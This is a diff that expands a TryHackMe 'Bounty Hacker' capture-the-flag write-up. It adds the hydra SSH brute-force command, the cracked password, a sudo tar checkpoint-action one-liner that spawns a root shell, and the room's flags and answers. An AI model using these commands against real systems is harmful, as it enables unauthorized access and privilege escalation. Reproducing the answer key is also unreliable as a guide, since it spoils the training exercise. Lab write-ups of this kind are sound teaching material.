@@ -1,75 +1,121 @@
 # Bounty Hacker - TryHackMe Writeup
 
 ## Room Overview
-This room involves exploiting a vulnerable web application to find flags and complete objectives.
+This room involves exploiting a vulnerable web application through FTP enumeration, SSH brute forcing, and privilege escalation using a misconfigured sudo binary.
 
 ## Reconnaissance
 
 ### Nmap Scan
 ```bash
-nmap -sV -p- <target_ip>
+nmap -sV Target_ip
 ```
 
 **Open Ports:**
-- Port 21: FTP
-- Port 22: SSH
-- Port 80: HTTP
+- Port 21: FTP (vsftpd 3.0.5)
+- Port 22: SSH (OpenSSH 8.2p1 Ubuntu)
+- Port 80: HTTP (Apache httpd 2.4.41)
 
 ### FTP Enumeration
-Connected to FTP server anonymously:
-```bash
-ftp <target_ip>
+Connected to FTP server and discovered:
+- `task.txt` - Contains task information
+- `locks.txt` - Contains password wordlist
+
+**task.txt contents:**
+```
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
 ```
 
-**Findings:**
-- Found `task.txt` and `locks.txt` files
-- Downloaded files for analysis
+**locks.txt** - List of 26 potential passwords found
 
 ## Exploitation
 
-### FTP Credentials
-Found credentials from FTP enumeration.
+### Username Discovery
+From `task.txt`, identified the username: **lin** (signed by -lin)
 
-### SSH Access
-Logged in via SSH using discovered credentials:
+### SSH Brute Force Attack
+Used hydra to brute force SSH credentials:
 ```bash
-ssh <username>@<target_ip>
+hydra -l lin -P locks.txt -t 4 ssh://Target_ip
 ```
 
-### Flag 1
-Found in: `/home/<user>/`
+**Result:** 
+- Username: `lin`
+- Password: `RedDr4gonSynd1cat3`
 
-### Flag 2
-Found in: Root directory or specific location
+### SSH Access
+```bash
+ssh lin@Target_ip
+```
 
-### Privilege Escalation
-Identified vulnerability for privilege escalation.
+Successfully logged in as user `lin`
+
+## User Flag
+
+Located at: `/home/lin/Desktop/user.txt`
+
+**Flag:** `THM{CR1M3_SyNd1C4T3}`
+
+## Privilege Escalation
+
+### Sudo Privileges Check
+```bash
+sudo -l
+```
+
+**Result:** User `lin` can run `/bin/tar` with sudo privileges
+
+### Tar Exploit
+Used tar checkpoint exploit to spawn a root shell:
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+This command exploits tar's checkpoint feature to execute arbitrary commands as root.
+
+## Root Flag
+
+Located at: `/root/root.txt`
+
+**Flag:** `THM{80UN7Y_h4cK3r}`
+
+## Key Findings
+
+1. **Task Writer:** lin (from task.txt signature)
+2. **Credentials Found:** Through FTP enumeration and SSH brute force
+3. **Privilege Escalation:** Misconfigured sudo permissions on `/bin/tar` allowed privilege escalation via checkpoint-action exploit
 
 ## Answers
 
-1. **Who wrote the task?**
-   - Found in `task.txt`
+1. **Who wrote the task?** 
+   - lin
 
-2. **What service can you bruteforce with the text file found?**
-   - Answer: SSH
+2. **What service can you bruteforce with the text file found?** 
+   - SSH
 
-3. **What is the users password?**
-   - Found through analysis of `locks.txt`
+3. **What is the users password?** 
+   - RedDr4gonSynd1cat3
 
-4. **user.txt**
-   - [Flag content here]
+4. **user.txt:** 
+   - THM{CR1M3_SyNd1C4T3}
 
-5. **root.txt**
-   - [Flag content here]
+5. **root.txt:** 
+   - THM{80UN7Y_h4cK3r}
 
 ## Key Learnings
-- Importance of checking FTP for anonymous access
-- Credential discovery through file enumeration
-- SSH brute force attack methodology
-- Privilege escalation techniques
+
+- FTP enumeration can reveal valuable information (usernames, passwords lists)
+- Brute forcing SSH with hydra using wordlists
+- Identifying sudo privileges with `sudo -l`
+- Tar privilege escalation via checkpoint-action exploit
+- Importance of limiting sudo privileges to specific users
 
 ## Tools Used
-- nmap
-- ftp
-- hydra (for brute forcing)
-- ssh
+
+- **nmap** - Port scanning and service enumeration
+- **hydra** - SSH brute force attack
+- **ssh** - Remote shell access
+- **tar** - For privilege escalation exploit
+- **sudo** - Privilege escalation vector
